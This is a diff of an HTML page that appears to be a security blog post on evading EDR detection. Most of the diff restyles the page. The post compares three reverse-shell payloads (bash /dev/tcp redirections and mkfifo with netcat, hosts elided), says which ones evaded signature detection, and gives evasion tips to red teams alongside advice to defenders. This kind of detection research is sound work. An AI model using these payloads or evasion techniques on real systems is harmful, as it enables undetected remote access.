-            <strong>Behavior:</strong> Creates a bidirectional channel using a named pipe and netcat, bypassing Bash’s <code>/dev/tcp</code> feature entirely.
+            <strong>Behavior:</strong> Creates a bidirectional channel using a named pipe and netcat, bypassing Bash’s <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">/dev/tcp</code> feature entirely.
           </p>
         </div><br>
         <a href="../Projects/linux_bypass.MOV" style="background:#60a5fa; color:#fff; padding:.5rem 1rem; border-radius:6px; text-decoration:none;">View Demo</a>
-        <h2 style="margin:2rem 0 1rem; color:#2c3e50;">Summary of the Test</h2>
-        <div style="margin:1.2rem 0; padding:1.5rem; border-radius:12px; background:#f9fafb; border:1px solid #e5e7eb; box-shadow:0 4px 10px rgba(0,0,0,.05);">
+        <h2 style="margin:2rem 0 1rem; color:#e5e7eb;">Summary of the Test</h2>
+        <div style="margin:1.2rem 0; padding:1.5rem; border-radius:12px; background:#0b1220; border:1px solid rgba(148,163,184,.18); box-shadow:0 10px 24px rgba(0,0,0,.35);">
           <p style="margin:0 0 1.2rem; font-size:1rem; line-height:1.6;">
             All three payloads achieved the same outcome; <strong>a fully interactive reverse shell</strong>.
             What made the difference was not <strong><em>what they did</em></strong>, but <strong><em>how they looked syntactically</em></strong>, which will be explained in the table below t
@@ -301,55 +270,55 @@
           <div class="h-scroll" role="region" aria-label="Payload comparison table" tabindex="0">
             <table style="border-collapse:collapse; margin:1rem 0; font-size:.95rem; border-radius:8px">
               <thead>
-                <tr style="background:#f2f4f7;">
-                  <th style="text-align:left; padding:.9rem; border:1px solid #e0e0e0;">Payload</th>
-                  <th style="text-align:left; padding:.9rem; border:1px solid #e0e0e0;">Technique</th>
-                  <th style="text-align:left; padding:.9rem; border:1px solid #e0e0e0;">Detection Result</th>
+                <tr style="background:#0f172a;">
+                  <th style="text-align:left; padding:.9rem; border:1px solid rgba(148,163,184,.22); color:#e5e7eb;">Payload</th>
+                  <th style="text-align:left; padding:.9rem; border:1px solid rgba(148,163,184,.22); color:#e5e7eb;">Technique</th>
+                  <th style="text-align:left; padding:.9rem; border:1px solid rgba(148,163,184,.22); color:#e5e7eb;">Detection Result</th>
                 </tr>
               </thead>
               <tbody>
                 <tr>
-                  <td style="padding:.8rem; border:1px solid #e0e0e0; font-family:'Courier New', monospace; font-size:.9rem;">
+                  <td style="padding:.8rem; border:1px solid rgba(148,163,184,.22); font-family:'Courier New', monospace; font-size:.9rem;">
                     bash -i >& /dev/tcp/... 0>&1
                   </td>
-                  <td style="padding:.8rem; border:1px solid #e0e0e0;">
-                    Classic <code>/dev/tcp</code> redirection (stdout+stderr → socket)
+                  <td style="padding:.8rem; border:1px solid rgba(148,163,184,.22);">
+                    Classic <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">/dev/tcp</code> redirection (stdout+stderr → socket)
                   </td>
-                  <td style="padding:.8rem; border:1px solid #e0e0e0; font-weight:600; color:#d32f2f;">
+                  <td style="padding:.8rem; border:1px solid rgba(148,163,184,.22); font-weight:600; color:#f87171;">
                     Flagged (signature match)
                   </td>
                 </tr>
-                <tr style="background:#fafafa;">
-                  <td style="padding:.8rem; border:1px solid #e0e0e0; font-family:'Courier New', monospace; font-size:.9rem;">
+                <tr style="background:rgba(15,23,42,.55);">
+                  <td style="padding:.8rem; border:1px solid rgba(148,163,184,.22); font-family:'Courier New', monospace; font-size:.9rem;">
                     /bin/bash -l > /dev/tcp/... 0<&1 2>&1
                   </td>
-                  <td style="padding:.8rem; border:1px solid #e0e0e0;">
+                  <td style="padding:.8rem; border:1px solid rgba(148,163,184,.22);">
                     Step-by-step redirections (stdout first, then stdin/stderr)
                   </td>
-                  <td style="padding:.8rem; border:1px solid #e0e0e0; font-weight:600; color:#388e3c;">
+                  <td style="padding:.8rem; border:1px solid rgba(148,163,184,.22); font-weight:600; color:#4ade80;">
                     Not flagged (syntax evasion)
                   </td>
                 </tr>
                 <tr>
-                  <td style="padding:.8rem; border:1px solid #e0e0e0; font-family:'Courier New', monospace; font-size:.9rem;">
+                  <td style="padding:.8rem; border:1px solid rgba(148,163,184,.22); font-family:'Courier New', monospace; font-size:.9rem;">
                     mkfifo + nc + sh
                   </td>
-                  <td style="padding:.8rem; border:1px solid #e0e0e0;">
-                    Named pipe + netcat instead of <code>/dev/tcp</code>
+                  <td style="padding:.8rem; border:1px solid rgba(148,163,184,.22);">
+                    Named pipe + netcat instead of <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">/dev/tcp</code>
                   </td>
-                  <td style="padding:.8rem; border:1px solid #e0e0e0; font-weight:600; color:#388e3c;">
+                  <td style="padding:.8rem; border:1px solid rgba(148,163,184,.22); font-weight:600; color:#4ade80;">
                     Not flagged (different toolchain)
                   </td>
                 </tr>
               </tbody>
             </table>
           </div>
-          <div style="margin-top:1.2rem; padding:1rem 1.2rem; border-left:4px solid #3498db; background:#eef6fc; border-radius:6px; font-size:.95rem; line-height:1.5;">
-            <strong>Final takeaway:</strong> Functionally, all three commands do the same thing; they remap <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> into a network socket.
+          <div style="margin-top:1.2rem; padding:1rem 1.2rem; border-left:4px solid #60a5fa; background:#0b2540; border-radius:6px; font-size:.95rem; line-height:1.5; border:1px solid rgba(96,165,250,.18);">
+            <strong>Final takeaway:</strong> Functionally, all three commands do the same thing; they remap <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stdin</code>, <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stdout</code>, and <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stderr</code> into a network socket.
           </div>
         </div>
-        <h2 style="color:#2c3e50; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid #eee;">Implications for Security Teams</h2>
-        <h3 style="color:#3498db; margin:1.5rem 0 .8rem;">For Blue Teams (Defenders)</h3>
+        <h2 style="color:#e5e7eb; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid rgba(148,163,184,.2);">Implications for Security Teams</h2>
+        <h3 style="color:#60a5fa; margin:1.5rem 0 .8rem;">For Blue Teams (Defenders)</h3>
         <p style="margin:0 0 1.2rem;">Relying solely on signature-based detection is insufficient. To improve security posture:</p>
         <ul style="margin:0 0 1.2rem 1.2rem;">
           <li>Enable behavioral analysis features in your EDR</li>
@@ -357,7 +326,7 @@
           <li>Regularly test your defenses with varied techniques</li>
           <li>Monitor for suspicious parent-child process relationships</li>
         </ul>
-        <h3 style="color:#3498db; margin:1.5rem 0 .8rem;">For Red Teams (Attackers)</h3>
+        <h3 style="color:#60a5fa; margin:1.5rem 0 .8rem;">For Red Teams (Attackers)</h3>
         <p style="margin:0 0 1.2rem;">Understanding the underlying mechanics of detection evasion is crucial:</p>
         <ul style="margin:0 0 1.2rem 1.2rem;">
           <li>Avoid well-known patterns and signatures</li>
@@ -365,8 +334,8 @@
           <li>Consider using custom encoders or obfuscation techniques</li>
           <li>Always test techniques against target security controls</li>
         </ul>
-        <div style="background:#e8f5e9; padding:1.5rem; border-left:4px solid #4caf50; border-radius:4px;">
-          <h2 style="color:#2c3e50; border-bottom:2px solid #eee;">Conclusion</h2>
+        <div style="background:#0f2417; padding:1.5rem; border-left:4px solid #22c55e; border-radius:4px; border:1px solid rgba(34,197,94,.18);">
+          <h2 style="color:#e5e7eb; border-bottom:2px solid rgba(148,163,184,.2);">Conclusion</h2>
           <p>
             Minor changes in the way code is written can make a big difference in how well security tools detect threats, because many endpoint detection and response systems still rely a 
             lot on fixed patterns. The examples I tested with reverse shells show that security tools might not catch harmful actions if attackers use unusual ways of writing code or tools 
@@ -376,7 +345,7 @@
         </div>
       </div>
     </div>
-    <footer style="position:relative;  background:#2c3e50; color:#fff; border-radius:8px;">
+    <footer style="position:relative;  background:#0b1220; color:#fff; border-radius:8px; border:1px solid rgba(148,163,184,.18);">
       <div style="max-width:1000px; margin:0 auto; padding:20px; text-align:center;">
         <p style="margin:0 0 .6rem;">Crafted with Passion</p>
         <p style="margin:0;">2025 © Iron Hulk — All Rights Reserved.</p>
